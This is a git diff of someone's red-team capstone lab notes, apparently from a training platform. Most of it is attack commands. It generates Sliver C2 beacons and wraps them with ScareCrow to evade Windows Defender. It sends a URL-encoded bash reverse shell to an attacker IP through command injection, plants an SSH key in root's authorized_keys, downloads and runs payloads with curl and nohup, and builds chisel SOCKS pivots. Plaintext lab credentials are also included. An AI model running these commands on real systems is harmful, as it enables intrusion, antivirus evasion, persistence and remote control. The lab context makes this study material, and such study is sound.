@@ -44,6 +44,7 @@ Replace the third octet IPs
 ```bash
 sudo sed -i 's/.121./.118./g' /etc/hosts
 sed 's/.117./.103./g' -i internalHosts.txt
+sed 's/.116.126/.116.126/g' -i Red-Team-Capstone-Challenge-CMD-by-CMDs.md Red-Team-Capstone-Challenge-Credentials.md Red-Team-Capstone-Challenge-Helped-Through.md Red-Team-Capstone-Challenge-Notes.md
 ```
 
 Initial
@@ -63,13 +64,13 @@ Silver and EDR bypassing Scarecrow
 // 
 // remember to upx
 // For VPN
-generate --mtls 10.50.99.131:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-upgrade
-generate beacon --mtls 10.50.99.131:11012 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-update
-mtls -L 10.50.99.131 -l 11011
-mtls -L 10.50.99.131 -l 11012
+generate --mtls 10.50.116.126:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-upgrade
+generate beacon --mtls 10.50.116.126:11012 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-update
+mtls -L 10.50.116.126 -l 11011
+mtls -L 10.50.116.126 -l 11012
 
 // Server 1
-generate beacon --mtls 10.50.99.131:11013 -b --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin
+generate beacon --mtls 10.50.116.126:11013 -b --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin
 // ScareCrow to bypass Windows Defender - shoot fly with bozaka
 ./ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin -Loader binary -domain google.com
 ```
@@ -87,9 +88,9 @@ socks5 $ip $port
 
 
 // VPN chisel Client - local pivot
-nohup ./chisel client 10.50.99.131:20000 20001:127.0.0.1:20000 &
+nohup ./chisel client 10.50.116.126:20000 20001:127.0.0.1:20000 &
 // 01-09 for individual VPN client pivots, socks, fowards
-nohup ./chisel client 10.50.99.131:20000 R:127.0.01:20002:socks &
+nohup ./chisel client 10.50.116.126:20000 R:127.0.01:20002:socks &
 
 
 // 11-19 for individual * client pivots 
@@ -97,10 +98,10 @@ nohup ./chisel client 10.50.99.131:20000 R:127.0.01:20002:socks &
 nohup ./chisel client $VPNipaddress:$specificPort $pivotPort:127.0.0.1:$pivotPort &
 
 // reverse port forward syntax for the granular needs
-nohup ./chisel client 10.50.99.131:20000 R:127.0.0.1:6379:172.19.0.2:6379 &
+nohup ./chisel client 10.50.116.126:20000 R:127.0.0.1:6379:172.19.0.2:6379 &
 
 // reverse port forward syntax for the granular needs
-nohup ./chisel client 10.50.99.131:20000 R:127.0.0.1: &
+nohup ./chisel client 10.50.116.126:20000 R:127.0.0.1: &
 ```
 
 
@@ -132,13 +133,69 @@ mohammad.ahmed@corp.thereserve.loc
 
 ```
 
+The 
 ```bash
 
 
-rlwrap ncat -lvnp 36969 
-;/bin/bash+-c+'exec+bash+-i+%26>/dev/tcp/10.50.114.111/36969+<%261'
+sudo sed -i 's/.118./.119./g' /etc/hosts
+sed 's/.103./.119./g' -i internalHosts.txt
+sed 's/.116.126/.116.126/g' -i Red-Team-Capstone-Challenge-CMD-by-CMDs.md Red-Team-Capstone-Challenge-Credentials.md Red-Team-Capstone-Challenge-Helped-Through.md Red-Team-Capstone-Challenge-Notes.md
 
-curl http://10.50.99.131:8443/VPN-update -o VPN-update
+ssh e-citizen@10.200.119.250
+stabilitythroughcurrency
+# login for flags
+Username: nvm
+Password: PvH2VJqhnPMcbc0t
+# 
+
+
+generate --mtls 10.50.116.126:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-upgrade
+generate beacon --mtls 10.50.116.126:11012 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-update
+generate beacon -m 10.50.116.126:11013 -b http://10.50.116.126:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin
+mtls -L 10.50.116.126 -l 11011
+mtls -L 10.50.116.126 -l 11012
+mtls -L 10.50.116.126 -l 11013
+# scarecrow the bin for server01
+/opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin -Loader binary -domain bing.com
+# permissions
+sudo chown kali:kali * && chmod +x *
+# UPX!
+upx brute *
+
+# Start a listener, burpsuite and cmdi the vpn serve
+python -m http.server 8443
+rlwrap ncat -lvnp 36969 
+;/bin/bash+-c+'exec+bash+-i+%26>/dev/tcp/10.50.116.126/36969+<%261'
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/zc3tx/DGZGDr7KWUlAzH5stPT7oySNhZqe+1snxmByRA7kiIIp8tly12x7vxFCvwhf7R7Sp1qR0Pzi5S5uAGO//+YD4ukVDtzA0F0oi2KjWsGZB5I0HUp7QERY8nb9yL3rfTC6HIMF0cCBUU0zNkVnCSYeZDG7WePSp7lblIOBmHd54a+3UAaShQc8Fadk0IQchW8MAvRcyQM7J0F2fT/aPTmUbv77VrUWFapgwuUBydXZA9eu+YOn9y1g5ID3QL6UpVHjNAjXPw1byRiyMRPUZcCL9No5fNa7Lu3e6xqB7qvgT20CQuohkpckWBroFoitG/K0VVsFFwQWaXvZGLwKJtvBwscDVIcFdoqfUO9JNNZ9G0Q97t1CZTuT9vRLvlRyOp1gir/iE45hCzchmpz8SM4RvGo8gvpnKWy8//noDas6nXqRxwvAEKe2S4nbSFBD5Xt7gTOH1gukutcN0TDQ+Iw0tYNXpHnIgKzhx/CseyPd+1KPhbTtq5T44W9yc=" > authorized_keys
+curl http://10.50.116.126:8443/chisel -o chisel
+sudo cp authorized_keys /root/.ssh/authorized_keys
+ssh -i vpn_root.rsa root@10.200.119.12
+# Tools
+
+curl http://10.50.116.126:8443/VPN-upgrade -o VPN-upgrade
+
+# As root
+
+nohup ./VPN-upgrade &
+# As www-data
+./chisel server -host 10.50.116.126 -p 20000 --reverse --socks5 -v
+# On the VPN
+chmod +x *
+nohup ./chisel client 10.50.116.126:20000  R:20001:socks &
+# comment sock4 ... and add to /etc/proxychains4.conf:
+socks5  127.0.0.1 20001
+# rdp into server -1 
+proxychains xfreerdp /u: /p: /v:
+# google chrome http://10.50.116.126:8443/ 
+# Download Word.exe 
+# open powershell 
+
+
+
+
+# Linux beacon for later
+curl http://10.50.116.126:8443/VPN-update -o VPN-update
+nohup ./VPN-update &
 
 ```
 
@@ -149,7 +206,7 @@ curl http://10.50.99.131:8443/VPN-update -o VPN-update
 ```bash
 curl https://sliver.sh/install|sudo bash
 
-sudo apt install thunderbird remmina certipy-ad -y
+sudo apt install thunderbird remmina certipy-ad neo4j bloodhound-y
 # Authenicate
 # ssh e-citizen@10.200.121.250 - stabilitythroughcurrency
 thunderbird
@@ -163,4 +220,18 @@ python3 bopscrk.py -i
 
 cd ~/RedTeamCapstoneChallenge
 curl -L https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule -o OneRuleToRuleThemAll.rule  
+
+# Chisel building
+# To mimise binary size
+# -s strip binary of debug info
+# -w strip of dwarf infomation
+go build -ldflags="-s -w" 
+# Build for windows
+GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
+
+```
+
+Crying because of password changes
+```bash
+nohup nmap -sC -sV -p- 10.200.119.0/24 -oN vpn-free-lunch-sc-sv --min-rate 2000 & 
 ```
